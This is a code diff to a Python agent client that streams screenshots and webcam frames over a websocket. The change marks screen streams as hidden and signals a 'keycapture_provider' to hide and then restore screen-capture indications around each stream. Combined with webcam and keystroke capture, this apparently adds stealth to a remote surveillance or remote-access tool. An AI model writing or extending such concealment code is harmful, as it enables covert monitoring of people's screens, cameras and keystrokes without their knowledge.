@@ -243,11 +243,14 @@ class AgentClient:
         fps = min(max(float(payload.get("fps", 10)), 1.0), 15.0)
         frame_count = 0
         started = time.time()
+        stream_payload = dict(payload)
+        stream_payload["_screen_hidden"] = True
+        self._notify_handler_provider("screen_capture_hide")
         self._send(ws, {"type": "stream_status", "command_id": command_id, "agent_id": agent_id, "stream": stream, "status": "running", "fps": fps})
         try:
             while not stop_stream.is_set() and not self.stop_event.is_set():
                 frame_started = time.time()
-                frame = self.handlers.handle("screen.screenshot", payload)
+                frame = self.handlers.handle("screen.screenshot", stream_payload)
                 image = frame.get("image")
                 if image:
                     self._send(
@@ -286,6 +289,7 @@ class AgentClient:
             )
             self._send(ws, result(command_id, agent_id, False, error=str(exc)))
         finally:
+            self._notify_handler_provider("screen_capture_restore")
             self.active_streams.pop(stream, None)
 
     def _stream_webcam_frames(self, ws, command_id: str, agent_id: str, payload: dict, stop_stream: threading.Event) -> None:
@@ -357,6 +361,11 @@ class AgentClient:
             if cap is not None:
                 cap.release()
             self.active_streams.pop("webcam", None)
+
+    def _notify_handler_provider(self, action: str) -> None:
+        provider = getattr(self.handlers, "keycapture_provider", None)
+        if callable(provider):
+            provider(action)
 
     def _send(self, ws, message: dict) -> None:
         with self.send_lock:
